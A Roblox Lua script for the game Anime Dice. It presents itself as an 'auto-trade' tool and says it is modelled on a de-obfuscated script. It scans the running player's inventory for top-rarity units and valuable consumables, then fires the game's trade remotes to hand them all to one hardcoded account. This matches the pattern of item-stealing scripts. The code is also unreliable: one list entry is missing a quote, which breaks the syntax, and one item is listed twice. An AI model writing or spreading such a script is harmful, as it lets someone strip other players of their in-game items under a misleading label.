-- Anime Dice Auto-Trade (using DataController + EntryRegistry)
-- Based on the pattern from the de-obfuscated script

local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")

local TARGET_NAME = "only1Sherifalt1"
local ADD_DELAY = 0.7

-- Rarity filter: set to true for rarities you want to send
local RARITY_FILTER = {
	["Celestial"] = true,
	["Secret I"] = true,
	["Secret II"] = true,
	["Mythical"] = true,
}

-- Consumables to send (if owned)
local CONSUMABLES = { "Luck III", "Luck II", "Luck I", "Lucky Spin", "Gems", "Luck IV", Income IV", "Jackpot Spin", "Gems", "Trait Reroll" }

-- Get DataController and EntryRegistry
local DataController = RS.Framework.Features.Data.DataController
local ok, DC = pcall(require, DataController)
if not ok then
	warn("[ERROR] Could not load DataController")
	return
end

local ER = RS.Framework.Features.Inventory.Kinds.Unit.UnitConfig
local ok2, EntryRegistry = pcall(require, ER)
if not ok2 then
	warn("[ERROR] Could not load EntryRegistry")
	return
end

-- Unwrap: if value is callable (reactive getter), call it
local function unwrap(value)
	if type(value) == "function" then
		local ok, result = pcall(value)
		return ok and result or nil
	end
	local mt = type(value) == "table" and getmetatable(value)
	if mt and mt.__call then
		local ok, result = pcall(function() return value() end)
		return ok and result or value
	end
	return value
end

-- Deep unwrap: flatten a reactive table + merge cached values
local function deepUnwrap(source)
	local out = {}
	local flat = unwrap(source)
	if type(flat) == "table" then
		for k, v in pairs(flat) do
			out[k] = v
		end
	end
	if type(source) == "table" then
		local cached = rawget(source, "___C")
		if type(cached) == "table" then
			for k, v in pairs(cached) do
				if out[k] == nil then
					local inner = unwrap(v)
					if inner ~= nil then
						out[k] = inner
					end
				end
			end
		end
	end
	return out
end

-- Get your inventory
local inventory = deepUnwrap(DC.Inventory)
if not inventory or type(inventory) ~= "table" then
	warn("[ERROR] Could not read inventory")
	return
end

-- Get entry config by name (from EntryRegistry)
local function getConfig(name)
	if not EntryRegistry then return nil end
	return EntryRegistry[name] or nil
end

-- Get rarity of an entry
local function getRarity(entry)
	if type(entry) ~= "table" or not entry.name then
		return nil
	end
	local cfg = getConfig(entry.name)
	if not cfg then return nil end
	
	-- Try dynamic getRarity function
	if type(cfg.getRarity) == "function" then
		local attrs = entry.attributes or {}
		local ok, rarity = pcall(cfg.getRarity, attrs)
		if ok and type(rarity) == "string" then
			return rarity
		end
	end
	
	-- Fall back to static rarity
	if type(cfg.rarity) == "string" then
		return cfg.rarity
	end
	return nil
end

-- Build trade list
local toTrade = {}
local placedUnitIds = {}

print("[SCAN] Building trade offer...")

-- 1) Scan for units matching rarity filter
local unitCount = 0
for key, entry in pairs(inventory) do
	if type(key) == "string" and type(entry) == "table" and entry.name then
		local cfg = getConfig(entry.name)
		if cfg and cfg.kind == "Unit" then
			local rarity = getRarity(entry)
			if rarity and RARITY_FILTER[rarity] then
				table.insert(toTrade, { key, 1, entry.name .. " (" .. rarity .. ")" })
				unitCount = unitCount + 1
				if unitCount <= 5 then
					print("  [UNIT] " .. entry.name .. " (" .. rarity .. ")")
				end
			end
		end
	end
end
print("[SCAN] Found " .. unitCount .. " matching units")

-- 2) Add consumables
print("[SCAN] Looking for consumables...")
for _, cname in ipairs(CONSUMABLES) do
	local item = inventory[cname]
	if type(item) == "table" and type(item.amount) == "number" and item.amount > 0 then
		table.insert(toTrade, { cname, item.amount, cname .. " x" .. item.amount })
		print("  [FOUND] " .. cname .. " x" .. item.amount)
	end
end

if #toTrade == 0 then
	warn("[ERROR] Nothing to trade!")
	return
end

-- Get remotes
local network = RS:FindFirstChild("Network")
local svc = network and network:FindFirstChild("TradeService")
local RE = svc and svc:FindFirstChild("RE")
local RequestTrade = RE and RE:FindFirstChild("RequestTrade")
local ChangeOffer = RE and RE:FindFirstChild("ChangeOffer")
local AdvanceTrade = RE and RE:FindFirstChild("AdvanceTrade")

if not (RequestTrade and ChangeOffer and AdvanceTrade) then
	warn("[ERROR] Trade remotes not found")
	return
end

-- Get target
local target = Players:FindFirstChild(TARGET_NAME)
if not target then
	warn("[ERROR] Target not found")
	return
end

-- Execute trade
print("[TRADE] Requesting trade with " .. #toTrade .. " items...")
task.wait(3)
RequestTrade:FireServer(target)
task.wait(3)

print("[TRADE] Adding items...")
for _, item in ipairs(toTrade) do
	local key, qty, label = item[1], item[2], item[3]
	local ok, err = pcall(function()
		ChangeOffer:FireServer(key, qty)
	end)
	print(ok and ("[OK] " .. label) or ("[FAIL] " .. label .. ": " .. tostring(err)))
	task.wait(ADD_DELAY)
end

print("[TRADE] Advancing...")
task.wait(1)
AdvanceTrade:FireServer()
print("[DONE]")
